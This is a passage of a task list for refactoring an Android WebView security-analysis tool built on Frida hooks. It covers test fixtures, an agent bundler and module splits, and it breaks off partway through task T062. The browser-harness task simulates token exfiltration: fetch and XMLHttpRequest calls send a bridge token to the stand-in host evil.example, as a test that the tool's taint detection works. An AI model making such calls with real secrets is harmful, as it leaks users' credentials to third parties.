---
description: "Task list for refactoring Sentry into browser/, native/ and core/"
---

# Tasks: Refactor Sentry by Responsibility

**Input**: Design documents from `/specs/001-refactor-by-responsibility/`

**Prerequisites**: [plan.md](./plan.md), [spec.md](./spec.md), [research.md](./research.md), [data-model.md](./data-model.md), [contracts/](./contracts/), [quickstart.md](./quickstart.md)

**Tests**: These are required, not optional. The spec mandates the golden regression check (FR-016, FR-017), and the plan adds the parity, bundle, layering and contract tests. All of them use the Python stdlib `unittest`; Node is optional.

**Organization**: Tasks are grouped by user story.
- **US1 (MVP)** moves the existing logic *as a whole* into `sentry/browser|native|core`, with identical behavior.
- **US2** extracts the browser code into its own files.
- **US3** splits the native hooks by API family.
- **US4** splits the core into its sub-areas.

## Format: `[ID] [P?] [Story] Description`

- **[P]**: can run in parallel (different files, no dependency on unfinished tasks)
- **[Story]**: US1–US4 from spec.md

## Global rules for every task

- **Golden gate**: after every task that changes a file under `sentry/`, run `python3 -m unittest tests.test_report_golden`. If it fails, fix the change before moving on. Never regenerate the expected reports to make a test pass.
- **Move, don't rewrite**: copy legacy code verbatim. Change it only where the task says so. The legacy references are frozen in `tests/fixtures/legacy/`.
- **Responsibility headers**: every new source file starts with a header comment of 1–3 lines that states its area (`browser`, `native` or `core`) and its responsibility (FR-015). Use `//` in JS, a module docstring in Python and `#` in shell.
- **POSIX shell**: shell files under `sentry/core/run/` and `sentry/core/runners/` must be POSIX `sh`. They must not use `local`, arrays or `[[`.

---

## Phase 1: Setup (Shared Infrastructure)

**Purpose**: create the directory skeleton, freeze the legacy sources and add the test helpers.

- [X] T001 Create the directory skeleton:
  - `sentry/browser/observer/`, `sentry/native/`
  - `sentry/core/events/`, `sentry/core/agent/`, `sentry/core/run/`, `sentry/core/runners/container/`, `sentry/core/report/rules/`, `sentry/core/benchmark/`
  - `tests/fixtures/logs/synthetic/`, `tests/fixtures/logs/benchmark/`, `tests/fixtures/expected/`, `tests/fixtures/legacy/`, `tests/tools/`

  Add a `.gitkeep` to every directory that is empty.
- [X] T002 [P] Freeze the legacy sources from commit `7936080` into `tests/fixtures/legacy/`, using `git show 7936080:<path> > tests/fixtures/legacy/<name>` for each of:
  - `sentry/report.py` → `report.py`
  - `sentry/hooks/webview.js` → `webview.js`
  - `sentry/hooks/getenv.js` → `getenv.js`
  - `analyse.sh` → `analyse.sh`
  - `scripts/run-benchmarks-linux.sh` → `run-benchmarks-linux.sh`
  - `sentry/run.sh` → `sentry-run.sh`

  Add `tests/fixtures/legacy/README.md`: "Frozen pre-refactor sources used only as test oracles. Do not edit."
- [X] T003 [P] Create Python package markers that contain only a docstring naming the area's responsibility, per [plan.md](./plan.md):
  - `sentry/core/__init__.py`
  - `sentry/core/report/__init__.py`
  - `sentry/core/report/rules/__init__.py`
- [X] T004 [P] Create `tests/__init__.py` (empty) and `tests/helpers.py`. The helpers module defines:
  - the constants `REPO_ROOT`, `SENTRY_DIR`, `FIXTURES`, `LOGS_DIR`, `EXPECTED_DIR`, `LEGACY_DIR`;
  - `case_name(log_path)`: the path relative to `LOGS_DIR`, without `.log`, with `/` replaced by `__`. For example `synthetic/full.log` becomes `synthetic__full`;
  - `case_args(log_path)`: the extra CLI args read from a sibling `<name>.args` file, one arg per line, or `[]` if the file is absent;
  - `run_report(script_path, log_path, out_dir)`: runs `python3 <script_path> <log> --json <out>/report.json --markdown <out>/report.md <args>` through `subprocess` and returns the `CompletedProcess`;
  - `have_node()`: `shutil.which("node") is not None`.
- [X] T005 [P] Add `sentry/build/` to `.gitignore`, in the existing block that lists `target/`, `logs/` and `benchmark-results/`.
- [X] T006 [P] Create `tests/layering_helpers.py`, a plain module with no test classes, holding the helpers below. US2, US3, US4 and the Polish phase each add their own test file that imports it (`tests/test_layering_browser.py`, `_native`, `_core` and `_layout`), so they can be worked on in parallel without touching the same file.
  - `iter_files(area_dir, suffixes)`
  - `line_count(path)`
  - `assert_no_pattern(testcase, files, regex, why)`
  - `assert_has_header(testcase, path)`: the first non-shebang line is a comment or docstring that mentions `browser`, `native` or `core`.

---

## Phase 2: Foundational (Blocking Prerequisites)

**Purpose**: the behavior baseline and the shared event vocabulary. **No code may move into `sentry/browser|native|core` until this phase passes against the unchanged legacy code.**

### Synthetic fixtures (they reach every analyzer branch)

Before writing any of these, read `tests/fixtures/legacy/report.py`, lines 120–810. Each line in a log is one JSON object: `{"type": ..., "timestamp": "2026-01-01T00:00:0N.000Z", "data": {...}}`. Use strictly increasing timestamps. Use the payload keys from [contracts/event-vocabulary.md](./contracts/event-vocabulary.md).

- [X] T007 [P] Write `tests/fixtures/logs/synthetic/settings.log`. It needs `webview.added` and `webview.settings.changed` events for every key in `DANGEROUS_SETTINGS` with the risky value: `True`, or `False` for `setSafeBrowsingEnabled`. It also needs `setMixedContentMode` with value `0` (always allow, which triggers `WV-MIXED-CONTENT`) and one non-risky setting (`setDomStorageEnabled`). Put `args` as a list, for example `"args": [true]`, and include `retval: null`.
- [X] T008 [P] Write `tests/fixtures/logs/synthetic/navigation.log`, with `url.loaded` events for:
  - an `http://` URL (`WV-CLEARTEXT-URL`);
  - a `file:///android_asset/index.html` URL (`WV-FILE-URL-LOADED`);
  - `source: "loadData"` (`WV-INLINE-CONTENT`);
  - `source: "loadDataWithBaseURL"` with `baseUrl`;
  - an `https://` URL;
  - `webview.page.loaded`, `webview.client.set` and `webview.chrome_client.set` events.
- [X] T009 [P] Write `tests/fixtures/logs/synthetic/bridge.log`, containing:
  - `bridge.added` on a remote `http://` origin (`WV-JS-BRIDGE-EXPOSED`);
  - `bridge.method.added` with the sensitive name `getToken` and `sensitive: true` (`WV-SENSITIVE-BRIDGE-METHOD`);
  - `bridge.method.called` from a remote origin (`WV-BRIDGE-CALLED-BY-REMOTE-CONTENT`);
  - a `js.probe` with `name: "bridge.method.return.tainted"` and `taints` (a taint source);
  - a `js.probe` with `name: "fetch"` whose `taints` refer to that taint (`WV-TAINTED-BRIDGE-DATA-TO-JS-SINK`).
- [X] T010 [P] Write `tests/fixtures/logs/synthetic/javascript.log`, containing:
  - `js.evaluated` (`WV-JS-EVALUATED`);
  - a `js.probe` with `name: "eval"` (`WV-JS-EVAL`);
  - a `js.probe` `fetch` to an `http://` URL (`WV-JS-CLEARTEXT-NETWORK`);
  - a `js.probe` `XMLHttpRequest.open`;
  - `js.probe.error` (`WV-PROBE-ERROR`).
- [X] T011 [P] Write `tests/fixtures/logs/synthetic/permissions.log`, containing:
  - `permission.requested` with `resources: ["android.webkit.resource.VIDEO_CAPTURE"]` (`WV-WEB-PERMISSION-REQUEST`);
  - a geolocation `permission.requested`;
  - `permission.grant.called` (`WV-WEB-PERMISSION-GRANTED`);
  - `permission.deny.called`.
- [X] T012 [P] Write `tests/fixtures/logs/synthetic/edge_empty.log` (0 bytes) and `tests/fixtures/logs/synthetic/edge_malformed.log`. The malformed file mixes, in order:
  - Frida banner text lines;
  - a blank line;
  - `{not json`;
  - `["array"]`;
  - `{"no_type": 1}`;
  - a line with the prefix `[Remote::app]-> ` followed by a valid event;
  - an event with an unknown type `x.unknown`.
- [X] T013 Write `tests/fixtures/logs/synthetic/full.log` as the concatenation, in order, of T007–T011. Rewrite the timestamps so they stay strictly increasing, and spread the events across two `webViewId` values. Then write `tests/fixtures/logs/synthetic/trusted.log`, a copy of `bridge.log`, with `tests/fixtures/logs/synthetic/trusted.args` containing the two lines `--trusted-origin` and the remote origin used in `bridge.log`.

### Benchmark captures (pre-refactor code; manual, Linux/KVM host)

- [ ] T014 On a Linux host with `/dev/kvm`, at commit `7936080`, run `scripts/run-benchmarks-linux.sh`. For each `Benchmark/*.apk`, copy `benchmark-results/<name>/output.log` to `tests/fixtures/logs/benchmark/<name>.log`, where `<name>` is the APK basename without `.apk`, keeping spaces as they are. Record the host, the date and the `frida-tools` version in `tests/fixtures/logs/benchmark/README.md`. For each log added after T016 has run, run `python3 tests/tools/regen_expected.py --legacy tests/fixtures/legacy/report.py --only benchmark__<name>` and commit the new `tests/fixtures/expected/benchmark__<name>/`. **If no KVM host is available**, create `tests/fixtures/logs/benchmark/README.md` saying the captures are pending, and continue. T018 will then fail until this task is done (FR-017, SC-001). **Pending:** no Linux/KVM host available; `tests/fixtures/logs/benchmark/README.md` records the status.

### Golden harness

- [X] T015 Implement `tests/tools/regen_expected.py`, with the CLI `--legacy PATH`, `[--only CASE]` and `[--force]`.
  - For every `tests/fixtures/logs/**/*.log`, it runs `helpers.run_report(<legacy>, log, tests/fixtures/expected/<case>/)`.
  - It writes `stdout.txt`, holding the CLI stdout with the output paths replaced by `<JSON>` and `<MD>`, next to `report.json` and `report.md`.
  - It refuses to overwrite an existing case without `--force`.
  - It exits non-zero if the legacy CLI fails.
- [X] T016 Generate the expected outputs with `python3 tests/tools/regen_expected.py --legacy tests/fixtures/legacy/report.py`, then commit `tests/fixtures/expected/`. Check by hand that `synthetic__full/report.json` contains findings.
- [X] T017 Implement `tests/test_report_golden.py`. It runs `sentry/report.py` on each fixture log, writing to a temp dir, and asserts:
  - (a) `report.json` matches the expected file byte for byte;
  - (b) `report.md` matches byte for byte;
  - (c) the normalized stdout equals `stdout.txt`;
  - (d) the exit code is 0.

  Use `subTest(case=...)` for each case.
- [X] T018 Add two guard tests to `tests/test_report_golden.py`:
  - `test_rule_coverage`: the union of `rule_id`s across all expected `report.json` files must contain all 22 ids listed in [data-model.md](./data-model.md#finding-findingspy). Copy the list into the test as a literal.
  - `test_benchmark_logs_complete`: every `Benchmark/*.apk` has a matching `tests/fixtures/logs/benchmark/<basename>.log`. The test skips only when `SENTRY_ALLOW_MISSING_BENCHMARK_LOGS=1`.
- [X] T019 [P] Implement `tests/tools/compare_event_streams.py OLD NEW`, following the "Normalization" section of [contracts/event-vocabulary.md](./contracts/event-vocabulary.md).
  - Parse lines the same way `load_events` does.
  - Mask `timestamp`, `__sentry_webview_[a-z0-9]+`, `<class>:<int>` hash keys, `taint-\d+-\d+` ids and every `retval` value.
  - Compare the multiset of `(type, sorted(data.keys()))`, then the normalized payloads.
  - Print a diff summary and exit 1 on any difference.
- [X] T020 Create `sentry/core/events/event_types.json` with exactly the 16 entries, in the key order given in [contracts/event-vocabulary.md](./contracts/event-vocabulary.md).
- [X] T021 Create `sentry/core/events/__init__.py`. It loads `event_types.json` with `Path(__file__).with_name("event_types.json")` and exposes `EVENT_TYPES: dict[str, str]` (order kept), a class `EventType` with one class attribute per key (for example `EventType.URL_LOADED == "url.loaded"`), and `ALL: tuple[str, ...]`. Use the stdlib only.
- [X] T022 [P] Implement `tests/test_events.py`. It extracts the `EVENT_TYPE` object literal from `tests/fixtures/legacy/webview.js` by regex and asserts that it equals `sentry/core/events/event_types.json`, key order included. It also asserts that `EventType` exposes every key.

- [X] T023 Record the approved decision in `specs/001-refactor-by-responsibility/research.md` R5 and in `contracts/cli-analyse.md`: `find_aapt` and the package-name parsing are unified (approved on 2026-10-16, FR-001 exception). This is already done in the design docs, so check that both files say "approved" and that nothing says "needs your sign-off".

**Checkpoint**: `python3 -m unittest tests.test_report_golden tests.test_events` passes against the **unchanged** `sentry/report.py`. Commit the baseline.

---

## Phase 3: User Story 1 - Analysis results are unchanged after the refactor (Priority: P1) 🎯 MVP

**Goal**:
- All toolchain logic lives under `sentry/browser|native|core`. In this phase it is moved as a whole: one native hook file, one report module, one orchestration script.
- The agent runs as a single bundled script.
- Every command, output and report is identical.

**Independent Test**:
- `python3 -m unittest discover -s tests` passes.
- [quickstart.md](./quickstart.md) scenarios A, B, E and F pass: the golden reports are identical, `analyse.sh` keeps its contract, and the event streams of a live run match the baseline.

### Tests for User Story 1

- [X] T024 [P] [US1] Implement `tests/test_cli_contract.py`. Run the scenarios with `cwd=REPO_ROOT` and `env` holding `PATH` plus `SENTRY_RUNNER` where needed.
  - (1) `sh analyse.sh` with no args: exit code 1, and stdout contains `Sentry - version alpha` and `Usage: analyse.sh <apk> [<apk-package>]`.
  - (2) `sh analyse.sh missing.apk pkg`: exit 1 and `File not found: missing.apk`.
  - (3) `SENTRY_RUNNER=bogus sh analyse.sh README.md pkg`: exit 1 and `Error: invalid SENTRY_RUNNER 'bogus' (expected auto, docker, or local)`. Also assert that no `target/.env` was created by this run: remove `target/.env` before the run if it exists.
  - (4) `bash scripts/run-benchmarks-linux.sh --help`: exit 0, and stdout starts with `Usage: run-benchmarks-linux.sh [benchmark-dir]`.
  - (5) For each of (1)–(3), copy `tests/fixtures/legacy/analyse.sh` to `<tmpdir>/analyse.sh` and run `sh analyse.sh …` with `cwd=<tmpdir>`. For (2) and (3), put the same input files into `<tmpdir>`. Then run the same args against the real launcher with `cwd=REPO_ROOT`, and assert that the stdout and exit code are the same. **Never write `analyse.sh` or any other file in the repo root.**
- [X] T025 [P] [US1] Implement `tests/test_agent_bundle.py`. It runs `python3 sentry/core/agent/build_agent.py --out <tmp>/a.js` twice and asserts:
  - both builds exit 0 and produce byte-identical output;
  - the output starts with `// GENERATED by core/agent/build_agent.py`;
  - it contains `const EVENT_TYPE = Object.freeze(` and `const BROWSER_SOURCES = Object.freeze(`;
  - if `have_node()`, `node --check <tmp>/a.js` exits 0;
  - a manifest whose two sources both declare `function dup(){}` makes the build exit 1 with stderr containing `build_agent: duplicate top-level name 'dup'`. Use a temp `--root` and `--manifest`.

### Implementation for User Story 1

**Report → core (moved as a whole)**

- [X] T026 [US1] Move the body of `sentry/report.py` verbatim to `sentry/core/report/cli.py`, keeping `main()` and `build_arg_parser()`. Then make these changes:
  - In `Analyzer.observe`, replace the 10 event-type string literals with `EventType.*` from `core.events`, imported as `from core.events import EventType`.
  - Add the core responsibility docstring.
- [X] T027 [US1] Replace `sentry/report.py` with a launcher that contains no logic. It keeps the shebang, adds a docstring, puts its own directory on `sys.path` with `sys.path.insert(0, str(Path(__file__).resolve().parent))`, then runs `from core.report.cli import main` and `raise SystemExit(main())`. Also add `sentry/core/report/__main__.py`, which calls `main()`. Run the golden gate.

**Agent runtime and bundler**

- [X] T028 [P] [US1] Create `sentry/core/agent/sanitize.js` with `sanitize()`, copied verbatim from `tests/fixtures/legacy/webview.js` lines 394–428, including the comment above it.
- [X] T029 [P] [US1] Create `sentry/core/agent/emitter.js` with:
  - top-level `const messages = [];`
  - `function log(type, data, timestamp = new Date().toISOString())`, with the same body as legacy line 473–475;
  - `function flush()`, with the body of legacy lines 1287–1292: sort by timestamp, `console.log(JSON.stringify(sanitize(message)))` for each message, then `messages.length = 0`.
- [X] T030 [US1] Create `sentry/native/webview_hooks.js`, a **temporary** home for the hooks as a whole, made from legacy `webview.js` with these changes:
  - Remove the `EVENT_TYPE` block. It now comes from the bundle header.
  - Remove `sanitize`, which is now in `core/agent`.
  - Inside `Java.perform`, remove `const messages = []` and the `log` arrow function, which are now in `emitter.js`.
  - In the `setInterval` callback, replace lines 1287–1292 with `flush();`.
  - Keep everything else verbatim, including `PROBE_POLLING_RATE`, `SENTRY_NAMESPACE`, `SENSITIVE_BRIDGE_METHOD_RE`, the three `build*Script` functions and `unwrapEvaluateJavascriptValue`.

  Add a header that says "native: temporary, all WebView hooks; split by family in US3".
- [X] T031 [P] [US1] Create `sentry/native/environment.js` with the legacy `getenv.js` body verbatim. It keeps **its own** `Java.perform(() => { ... })`.
- [X] T032 [US1] Implement `sentry/core/agent/build_agent.py` following [contracts/agent-bundle.md](./contracts/agent-bundle.md):
  - **CLI**: `argparse` with `--root` (default: the parent of `core/`, that is `sentry/`), `--manifest` (default `<root>/core/agent/manifest.json`) and `--out` (required).
  - **Output**, in this order:
    1. the line `// GENERATED by core/agent/build_agent.py — do not edit`;
    2. `const EVENT_TYPE = Object.freeze({...});`, one `KEY: "value",` line per entry in JSON order, matching legacy formatting;
    3. `const BROWSER_SOURCES = Object.freeze({ <name>: <json.dumps(source)>, ... });`. Write `{}` when there are no browser entries. For `"wrap": "iife"`, join the files with `\n` inside `(function() {\n` … `\n})();`;
    4. each source file, preceded by `// --- <relative path>`.
  - **Failures**:
    - a missing file gives `build_agent: missing file <path>`;
    - a browser source that contains `${` gives `build_agent: template literal in browser source <path>`;
    - a duplicate top-level `function NAME`, `const NAME`, `let NAME` or `class NAME` at column 0 across sources gives `build_agent: duplicate top-level name 'NAME'`.

    Each failure goes to stderr and exits 1.
  - Write the output with `\n` newlines and UTF-8, creating the parent directories. Use the stdlib only.
- [X] T033 [US1] Create `sentry/core/agent/manifest.json` (temporary US1 form) with these entries, in order:
  1. vocabulary `core/events/event_types.json`
  2. `core/agent/sanitize.js`
  3. `core/agent/emitter.js`
  4. `native/webview_hooks.js`
  5. `native/environment.js`

  Then run `python3 -m unittest tests.test_agent_bundle`.

**Orchestration and runners → core (moved as a whole)**

- [X] T034 [US1] Move the body of `analyse.sh`, everything after the shebang, to `sentry/core/run/main.sh`. Wrap it in `sentry_analyse() { ... }` and change only these things:
  - (a) Keep the `$1`/`$2` references; they become function args.
  - (b) Keep `$0` in the usage message. When the file is sourced, `$0` still names `analyse.sh`.
  - (c) In `run_local`, replace both `frida ... -l ./sentry/hooks/webview.js -l ./sentry/hooks/getenv.js` invocations with a build step, `python3 ./sentry/core/agent/build_agent.py --out ./target/agent.js || { echo "Error: failed to build Sentry agent"; exit 1; }`, run once before the `if`, followed by `-l ./target/agent.js`.
  - (d) Leave the `python3 ./sentry/report.py …` call in `generate_report` unchanged. That path is now the launcher from T027.
- [X] T035 [US1] Replace `analyse.sh` with this POSIX launcher: the shebang `#!/bin/sh`, a header comment, `SENTRY_HOME="$(dirname "$0")/sentry"`, `. "$SENTRY_HOME/core/run/main.sh"`, then `sentry_analyse "$@"`. Run `python3 -m unittest tests.test_cli_contract`.
- [X] T036 [P] [US1] Move the legacy body of `scripts/run-benchmarks-linux.sh` to `sentry/core/benchmark/run.sh`, changing only this: `ROOT_DIR="${SENTRY_ROOT:?SENTRY_ROOT must be set by the launcher}"`. Replace `scripts/run-benchmarks-linux.sh` with a bash launcher that does `SENTRY_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"` and `. "$SENTRY_ROOT/sentry/core/benchmark/run.sh"`. Sourcing it, rather than running it, keeps `$0` for the `usage` text.
- [X] T037 [P] [US1] Move `sentry/run.sh` to `sentry/core/runners/container/entry.sh`. Replace its `frida ... -l /sentry/hooks/webview.js -l /sentry/hooks/getenv.js` with `-l /sentry/build/agent.js`, and add a header.
- [X] T038 [US1] Update `sentry/Dockerfile`:
  - replace `COPY hooks/ /sentry/hooks/` and `COPY run.sh /sentry/run.sh` with `COPY browser/ /sentry/browser/`, `COPY native/ /sentry/native/` and `COPY core/ /sentry/core/`;
  - add `RUN python3 /sentry/core/agent/build_agent.py --root /sentry --out /sentry/build/agent.js` after the pip install;
  - change `CMD` to `["sh", "/sentry/core/runners/container/entry.sh"]`.

  Add `sentry/browser/.gitkeep` if `browser/` is still empty, so that the `COPY` succeeds.
- [X] T039 [P] [US1] Move `run-frida-server/Dockerfile` and `run-frida-server/run.sh` to `sentry/core/runners/container/frida-server/` with `git mv`, and change the `run-frida-server` service in `docker-compose.yml` to `build: ./sentry/core/runners/container/frida-server`. Keep the service name and every other key unchanged.
- [X] T040 [US1] Delete `sentry/hooks/` and `sentry/run.sh`, and confirm `run-frida-server/` is gone. Then run `grep -rn "sentry/hooks\|run-frida-server/\|sentry/run.sh" --exclude-dir=specs --exclude-dir=tests --exclude-dir=.git .`. It must only match `docker-compose.yml`'s service *name*, if anything.
- [X] T041 [US1] Run `python3 -m unittest discover -s tests` and quickstart scenarios A and B. Everything must pass, apart from `test_benchmark_logs_complete` if T014 is still pending.
- [ ] T042 [US1] **Depends on T014.** If T014 is still pending, first capture a local baseline: **Pending:** no emulator, adb or frida on the implementation host.
  1. `git stash -u` (or use a separate worktree) and `git checkout 7936080`;
  2. run `SENTRY_RUNNER=local ./analyse.sh Benchmark/JsUpdateCaseF.apk com.example.jsUpdatecaseF`;
  3. copy `logs/output.log` to `tests/fixtures/logs/benchmark/JsUpdateCaseF.log`, and note in `tests/fixtures/logs/benchmark/README.md` that it is a local-mode capture;
  4. `git checkout -`, `git stash pop`, then run `python3 tests/tools/regen_expected.py --legacy tests/fixtures/legacy/report.py --only benchmark__JsUpdateCaseF`.

  Then do the live check in local mode (quickstart E): `SENTRY_RUNNER=local ./analyse.sh Benchmark/JsUpdateCaseF.apk com.example.jsUpdatecaseF`, then `python3 tests/tools/compare_event_streams.py tests/fixtures/logs/benchmark/JsUpdateCaseF.log logs/output.log`. There must be no differences, and the findings and risk score in `target/report.json` must equal `tests/fixtures/expected/benchmark__JsUpdateCaseF/report.json`. Also check that Ctrl-C mid-run still writes the report and exits 130.
- [ ] T043 [US1] Live check, Docker mode (quickstart F), on a Linux/KVM host. Run `docker compose build sentry run-frida-server`, then `SENTRY_RUNNER=docker ./analyse.sh Benchmark/JsUpdateCaseF.apk com.example.jsUpdatecaseF`, and compare as in T042. **Pending:** no Linux/KVM host.

**Checkpoint (MVP)**:
- The three directories hold all the logic; root files are launchers only.
- The golden, contract and bundle tests pass.
- The live streams match the baseline.

---

## Phase 4: User Story 2 - Browser-side observation is standalone (Priority: P2)

**Goal**: all page-side code lives in `sentry/browser/` as plain `.js` files. Native code renders and delivers it, and contains no in-page code.

**Independent Test**:
- `python3 -m unittest tests.test_browser_parity tests.test_layering_browser tests.test_agent_bundle` passes.
- A live run's `js.probe` events match the baseline (T042 repeated).

### Tests for User Story 2

- [X] T044 [P] [US2] Implement `tests/tools/browser_harness.js`, a Node script with the stdlib only, run as `node browser_harness.js <legacy|bundle> <path>`.
  - **Load**:
    - `legacy`: load `tests/fixtures/legacy/webview.js` into a `vm` context where `Java = { perform() {} }`, appending `\n;({inj: buildInjectionScript(), probe: (id) => buildProbeScript(id), taint: buildBridgeTaintScript, ns: SENTRY_NAMESPACE})`.
    - `bundle`: build output, using the same stub, appending `\n;({inj: renderBrowserScript("observer", {__SENTRY_NAMESPACE__: SENTRY_NAMESPACE}), probe: (id) => renderBrowserScript("probe", {__SENTRY_NAMESPACE__: SENTRY_NAMESPACE, __SENTRY_WEBVIEW_ID__: id}), taint: (i, m, s) => renderBrowserScript("bridgeTaint", {__SENTRY_NAMESPACE__: SENTRY_NAMESPACE, __SENTRY_INTERFACE_NAME__: i, __SENTRY_METHOD_NAME__: m, __SENTRY_SOURCE__: s}), ns: SENTRY_NAMESPACE})`.
  - **Page context**: create a fresh `vm` context holding a fake `window` that is its own global, with:
    - stub `fetch`, `open`, `postMessage`, `navigator.sendBeacon`, `Location.prototype.assign/replace`;
    - an `XMLHttpRequest` class with `open` and `send`;
    - a `Storage` class with `setItem` and `getItem` backed by a `Map`, plus `localStorage` and `sessionStorage` instances;
    - `location.href = "https://app.example/"`;
    - a bridge object `AppBridge` with `getToken() { return "tok-123" }` and `log(x) {}`.
  - **Script**:
    1. evaluate `inj` twice (to check idempotence);
    2. evaluate `taint("AppBridge", "getToken", "bridge")`;
    3. call `AppBridge.getToken()`;
    4. call `localStorage.setItem("k", "tok-123")`, `localStorage.getItem("k")`, `fetch("http://evil.example/x?t=tok-123")`, `new XMLHttpRequest().open("GET", "http://evil.example/")` followed by `.send("tok-123")`, `navigator.sendBeacon("https://b.example", "tok-123")`, `postMessage("tok-123", "*")`, `open("https://w.example")` and `location.assign("https://a.example")`;
    5. evaluate `probe("wv-1")`.
  - **Output**: print `JSON.stringify` of the parsed probe result, with every `timestamp` set to `"T"`, `taint-\d+-\d+` replaced by `"taint-N"` and the namespace replaced by `"NS"`.
- [X] T045 [US2] Implement `tests/test_browser_parity.py`. It skips unless `have_node()`. It builds the bundle into a temp dir, runs the harness in both modes, and asserts the two outputs are equal and that the legacy output has at least 8 events.
- [X] T046 [P] [US2] Create `tests/test_layering_browser.py` with `class BrowserLayering`, using `tests/layering_helpers.py`. It asserts that the files under `sentry/browser/**/*.js`:
  - contain no `Java.`, `EVENT_TYPE`, `console.log(`, `send(` or `${`;
  - each have a header;
  - are each at most 430 lines.

### Implementation for User Story 2

Each fragment below is copied **verbatim** from the body of the legacy `buildInjectionScript` template (`tests/fixtures/legacy/webview.js` lines 30–340) and then de-templated:
- `${namespace}` becomes `__SENTRY_NAMESPACE__`;
- the outer `(function() {` and `})();` are removed, because the bundler adds them back;
- every other line stays the same.

- [X] T047 [P] [US2] Create `sentry/browser/observer/00_namespace.js`, holding legacy template lines 31–48: `const namespace = __SENTRY_NAMESPACE__;`, the idempotence early-return, the `state` object and `Object.defineProperty`.
- [X] T048 [P] [US2] Create `sentry/browser/observer/10_serialize.js` with `copyArg` and `report`, including the 500-event cap.
- [X] T049 [P] [US2] Create `sentry/browser/observer/20_taint.js` with `fingerprint`, `rememberTaint` (200-taint cap), `findTaint`, `taintsForArgs` and any helper defined between them in the legacy code.
- [X] T050 [P] [US2] Create `sentry/browser/observer/30_intercepts.js` with `intercept()` and its calls for `fetch`, `window.open`, `window.postMessage`, `navigator.sendBeacon`, `Location.prototype` and `XMLHttpRequest.prototype`.
- [X] T051 [P] [US2] Create `sentry/browser/observer/40_storage.js` with the `Storage.prototype` `setItem`/`getItem` taint propagation.
- [X] T052 [P] [US2] Create `sentry/browser/observer/50_bridge_wrapper.js` with `state.wrapBridgeMethod`, and the final `return true;` if the legacy template ends with one.
- [X] T053 [P] [US2] Create `sentry/browser/bridge_taint.js` from the legacy `buildBridgeTaintScript` template (lines 343–353), with `__SENTRY_NAMESPACE__`, `__SENTRY_INTERFACE_NAME__`, `__SENTRY_METHOD_NAME__` and `__SENTRY_SOURCE__` in place of the `${JSON.stringify(...)}` slots. Keep its own IIFE.
- [X] T054 [P] [US2] Create `sentry/browser/probe.js` from the legacy `buildProbeScript` template (lines 360–391), with `__SENTRY_NAMESPACE__` and `__SENTRY_WEBVIEW_ID__`. Keep its own IIFE.
- [X] T055 [US2] Add the three browser entries to `sentry/core/agent/manifest.json`, after the vocabulary entry: `observer`, with the six files and `"wrap": "iife"`, then `bridgeTaint`, then `probe`, exactly as in [contracts/agent-bundle.md](./contracts/agent-bundle.md).
- [X] T056 [US2] Create `sentry/native/browser_delivery.js` containing:
  - `PROBE_POLLING_RATE`, moved from `webview_hooks.js`;
  - `SENTRY_NAMESPACE`, moved, with the same expression;
  - `function renderBrowserScript(name, values)`, which:
    - takes `BROWSER_SOURCES[name]`;
    - replaces each key of `values` everywhere with `JSON.stringify(values[key])`, using `split(key).join(...)`;
    - throws `Error("unrendered placeholder in " + name)` if `/__SENTRY_[A-Z_]+__/` still matches;
  - `unwrapEvaluateJavascriptValue`, moved verbatim.
- [X] T057 [US2] In `sentry/native/webview_hooks.js`:
  - delete `buildInjectionScript`, `buildBridgeTaintScript`, `buildProbeScript`, `PROBE_POLLING_RATE`, `SENTRY_NAMESPACE` and `unwrapEvaluateJavascriptValue`;
  - replace `buildInjectionScript()` with `renderBrowserScript("observer", {__SENTRY_NAMESPACE__: SENTRY_NAMESPACE})`, computed once where `INJECTION` was assigned;
  - replace `buildBridgeTaintScript(i, m, s)` with `renderBrowserScript("bridgeTaint", {...})`;
  - replace `buildProbeScript(id)` with `renderBrowserScript("probe", {...})`.

  Add `native/browser_delivery.js` to the manifest just before `native/webview_hooks.js`.
- [X] T058 [US2] Write `sentry/browser/README.md`. It explains that the code runs inside WebView pages, gives the fragment order and the shared `state` contract, lists the placeholders, says that nothing outside the page may be referenced, and says how to add a new page API intercept (edit `30_intercepts.js` or add a fragment and register it in the manifest). Link [contracts/browser-scripts.md](./contracts/browser-scripts.md).
- [ ] T059 [US2] Run `python3 -m unittest tests.test_browser_parity tests.test_agent_bundle tests.test_layering_browser tests.test_report_golden`, then repeat the T042 live comparison, focusing on the `js.probe` events. This depends on the baseline log from T042. **Pending:** offline tests pass; the live `js.probe` comparison needs a device.

**Checkpoint**: there is no page-side code left in `sentry/native/`, and parity holds.

---

## Phase 5: User Story 3 - Native hooks split by API family (Priority: P2)

**Goal**: each intercepted Android API family has its own module in `sentry/native/`. `main.js` installs them in the legacy order.

**Depends on**: US2, because both edit `sentry/native/webview_hooks.js`.

**Independent Test**:
- `python3 -m unittest tests.test_layering_native tests.test_agent_bundle tests.test_browser_parity` passes.
- A live run compared with `compare_event_streams.py` shows no differences (T042 repeated).

### Tests for User Story 3

- [X] T060 [P] [US3] Create `tests/test_layering_native.py` with `class NativeLayering`, using `tests/layering_helpers.py`. It asserts:
  - `sentry/native/*.js` contain no `window.`, `window[` or `document.`, ignoring comment lines;
  - each file has a header and is at most 430 lines;
  - `sentry/native/webview_hooks.js` does not exist;
  - the file set equals `{registry, browser_delivery, webview_lifecycle, webview_settings, webview_clients, javascript_bridge, javascript_evaluation, permissions, environment, main}.js`.

### Implementation for User Story 3

Design rule: every family module exposes one `function install<Family>Hooks(ctx)`. `ctx` is built in `main.js` inside `Java.perform` and holds:
- the Java class handles from legacy lines 450–458;
- `registry`, `delivery`, `log`, `hookMethod`, and `INJECTION` if it is still needed.

Within a module, move the legacy statements verbatim and replace closure variables with `ctx.` references.

- [X] T061 [US3] Create `sentry/native/registry.js` with `function createRegistry(ctx)`. It returns an object holding:
  - the maps `webViews`, `settingsToWebView`, `bridgeObjects`, `webViewsById`, `bridgeTaintWrappersByWebView`, `hookedBridgeMethods`, `hookedWebViewClientClasses`, `hookedWebChromeClientClasses`;
  - the helpers `keyFor`, `classNameOf`, `stringValue`, `originForUrl`, `getWebViewState`, `updateWebViewUrl`, `registerSettings`, `extractRequestUrl`, all from legacy lines 463–558;
  - `hookMethod`, from legacy lines 634–647.
- [X] T062 [US3] Extend `sentry/native/browser_delivery.js` with `function createDelivery(ctx)`, returning `evaluateOnWebView`, `inject`, `injectBridgeTaintWrappers` and `pollAll()`:
  - the first three come from legacy lines 560–596;
